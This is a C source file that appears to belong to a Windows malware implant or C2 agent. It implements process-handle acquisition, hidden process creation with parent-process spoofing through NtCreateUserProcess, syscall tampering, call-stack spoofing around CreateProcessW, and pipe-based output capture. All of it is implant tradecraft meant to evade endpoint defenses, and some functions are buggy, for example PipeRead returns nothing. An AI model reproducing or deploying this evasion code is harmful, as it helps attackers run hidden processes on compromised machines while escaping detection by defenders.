//
// Created by Brendan Ortiz on 8/12/2024.
//
#include "../../headers/helpers/win32.h"
#include "../../headers/agent/evasion/Common.h"
#include "../../headers/cstdreplacement/localcstd.h"
#include <stdio.h>

HANDLE GetProcessHandleFromPID(DWORD dwPID) {

            CLIENT_ID threadClientID = {0};
            //threadClientID.UniqueThread = (HANDLE)te32.th32ThreadID;
            threadClientID.UniqueProcess = (HANDLE)dwPID;
            OBJECT_ATTRIBUTES objAttr = {0};
            InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

            HANDLE hProcess = NULL;
            NTSTATUS status = TAMPER_SYSCALL(agent->apis->pNtOpenProcess, 4, &hProcess, PROCESS_ALL_ACCESS, &objAttr, &threadClientID);
            if(NT_SUCCESS(status)) {
            	return hProcess;
            }

	return INVALID_HANDLE_VALUE;
}
//TODO replace this with NtQuerySystemInformation for more evasion.
HANDLE GetProcessHandleFromStr(LPCSTR ProcessName) {
	HANDLE hProcess = NULL;
	PROCESSENTRY32 pe32 = {0};
	pe32.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(hSnap == INVALID_HANDLE_VALUE) {
		return INVALID_HANDLE_VALUE;
	}

	if(!Process32First(hSnap, &pe32)) {
		CloseHandle(hSnap);
		return INVALID_HANDLE_VALUE;
	}

	do {
		//if we cannot open the process with PROCESS_ALL_ACCESS then we know it's not a process we've got access to. Continue through the loop and try again.
		if(StrCmpA(ProcessName, pe32.szExeFile) == 0) {

					CLIENT_ID threadClientID = {0};
					threadClientID.UniqueProcess = (HANDLE)pe32.th32ProcessID;
					OBJECT_ATTRIBUTES objAttr = {0};
					InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

					NTSTATUS status = agent->apis->pNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &threadClientID);
					if(NT_SUCCESS(status)) {
						CloseHandle(hSnap);
						return hProcess;
					}
		}

	} while(Process32Next(hSnap, &pe32));


	_EndOfFunc:
	if(hSnap != NULL)
		CloseHandle(hSnap);

	return hProcess;
}

BOOL NtProcessCreate(IN PWSTR TargetProcess, IN PWSTR ProcessParameters, IN PWSTR ProcessPath, IN HANDLE hParentProcess, IN BOOL PIPED, OUT PHANDLE hProcess, OUT PHANDLE hThread) {
	NTSTATUS				NtStatus					= 0;
	_INT_UNICODE_STRING		uNtImagePath				= {0},
							uCommandLine				= {0},
							uCurrentDirectory			= {0};
	PPIPE					pPipe						= NULL;

	pPipe = (PPIPE)agent->apis->pLocalAlloc(LPTR, sizeof(PIPE));

	P_INT_RTL_USER_PROCESS_PARAMETERS		 pProcessParams			= NULL;
	PPS_ATTRIBUTE_LIST pAttributeList = (PPS_ATTRIBUTE_LIST)agent->apis->pLocalAlloc(LPTR, sizeof(PS_ATTRIBUTE_LIST));
	if(!pAttributeList) {
		printf("[error] failed to allocate memory for attribute list\n");
		return FALSE;
	}

	_RtlInitUnicodeString(&uNtImagePath, TargetProcess);
	_RtlInitUnicodeString(&uCommandLine, ProcessParameters);
	_RtlInitUnicodeString(&uCurrentDirectory, ProcessPath);

	NtStatus = agent->apis->pRtlCreateProcessParametersEx(&pProcessParams, &uNtImagePath, NULL, &uCurrentDirectory, &uCommandLine,
		NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if(NtStatus != STATUS_SUCCESS) {
		printf("[error] failed to create process parameters %lx\n", NtStatus);
		goto _EndOfFunc;
	}

	pAttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);
	pAttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList->Attributes[0].Size = uNtImagePath.Length;
	pAttributeList->Attributes[0].Value = uNtImagePath.Buffer;

	if(hParentProcess != NULL) {
		pAttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
		pAttributeList->Attributes[1].Size = sizeof(HANDLE);
		pAttributeList->Attributes[1].Value = hParentProcess;
	} else {
		pAttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
	}

	PS_CREATE_INFO CreateInfo = {
		.Size = sizeof(PS_CREATE_INFO),
		.State = PsCreateInitialState,
	};

	NtStatus = TAMPER_SYSCALL(agent->apis->pNtCreateUserProcess, 11, (ULONG_PTR)hProcess, (ULONG_PTR)hThread, PROCESS_ALL_ACCESS , THREAD_ALL_ACCESS,
		NULL, NULL, NULL, NULL, (ULONG_PTR)pProcessParams, (ULONG_PTR)&CreateInfo, (ULONG_PTR)pAttributeList);
	if(NtStatus != STATUS_SUCCESS)
		printf("[error] attempting to create process %lx\n", NtStatus);

	if(hThread == NULL || hProcess == NULL) {
		printf("[error] failed to create process\n");
		goto _EndOfFunc;
	}

	DWORD Reuslt = ResumeThread(*hThread);
	if (Reuslt == -1) {
		printf("[error] failed to resume thread %lu\n", GetLastError());
		goto _EndOfFunc;
	}

	PUCHAR Buffer = NULL;
	INT Length = PipeRead(pPipe, Buffer);
	if( Length > 0 ){
		printf("[info] read %d bytes from pipe\n", Length);
	}

	_EndOfFunc:
	if(pAttributeList) {
		agent->apis->pLocalFree(pAttributeList);
		pAttributeList = NULL;
	}
	return *hProcess == NULL || *hThread == NULL ?  FALSE : TRUE;

}

BOOL ProcessCreate(BOOL PIPED, LPWSTR ApplicationName, LPWSTR CommandLine, LPPROCESS_INFORMATION pi, OUT PUCHAR Buffer) {

	PPIPE					pPipe						= NULL;
	pPipe = (PPIPE)agent->apis->pLocalAlloc(LPTR, sizeof(PIPE));

	BOOL Success = 0;
	STARTUPINFO si = {0};


	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	if(PIPED) {
		if(!PipeCreate(pPipe)) {
			printf("[error] failed to create pipe\n");
		} else {
			si.hStdInput = NULL;
			si.hStdOutput = pPipe->hWritePipe;
			si.hStdError = pPipe->hWritePipe;

		}
	}

	Success = (WINBOOL)SpoofStack(agent->apis->pCreateProcessW, 10, ApplicationName, CommandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, pi);
	if(!Success) {
		printf("[error] failed to create process %lu\n", GetLastError());
		return Success;
	}


	DWORD Status = 0;
	GetExitCodeProcess(pi->hProcess, &Status);
	if (Status != STILL_ACTIVE) {
		PipeRead(pPipe, Buffer);
	}

	return Success;
}

BOOL PipeCreate(OUT PPIPE pPipe) {

	if(pPipe == NULL)
		return FALSE;

	SECURITY_ATTRIBUTES SecAttr = {0};
	SecAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	SecAttr.bInheritHandle = TRUE;

	if(!agent->apis->pCreatePipe(&pPipe->hReadPipe, &pPipe->hWritePipe, &SecAttr, 0)) {
		return FALSE;
	}
	return TRUE;
}

INT PipeRead(IN PPIPE pPipe, PUCHAR Buffer) {

	UCHAR Buf[1024] = {0};
	DWORD BufferSize = 0;
	DWORD dwBytesRead = 0;
	BOOL Success = FALSE;

	//maybe try to read from the pipe after we close WritePipe
	if(pPipe->hWritePipe) {
		agent->apis->pNtClose(pPipe->hWritePipe);
		pPipe->hWritePipe = NULL;
	}

	Buffer = (PUCHAR)agent->apis->pLocalAlloc(LPTR, 0);
	if(Buffer == NULL) {
		return -1;
	}

	do {
		Success = agent->apis->pReadFile(pPipe->hReadPipe, Buf, 1024, &dwBytesRead, NULL);
		if(dwBytesRead == 0 ) {
			break;
		}
		BufferSize += dwBytesRead;
		Buffer = (PUCHAR)agent->apis->pLocalReAlloc(Buffer, BufferSize, LMEM_MOVEABLE);

		MemoryCopy(Buffer + (BufferSize - dwBytesRead), Buf, dwBytesRead);


	} while (Success == TRUE);


}